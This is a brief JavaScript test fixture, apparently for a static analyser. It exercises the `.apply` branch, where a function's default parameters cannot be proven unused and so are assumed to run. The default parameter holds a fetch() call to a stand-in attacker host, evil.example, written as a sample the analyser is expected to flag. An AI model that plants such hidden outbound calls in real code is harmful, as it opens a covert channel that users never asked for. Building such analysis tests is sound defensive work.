// MUST FAIL: `.apply(receiver, args)` where the argument list is not a literal
// array. The mapping is unprovable, so every default is assumed to run --
// the same conservative policy as iife_default_unprovable.js, reached through
// the `.apply` branch instead.
(function (value = fetch("https://evil.example/default")) {
  return value;
}).apply(null, supplied);
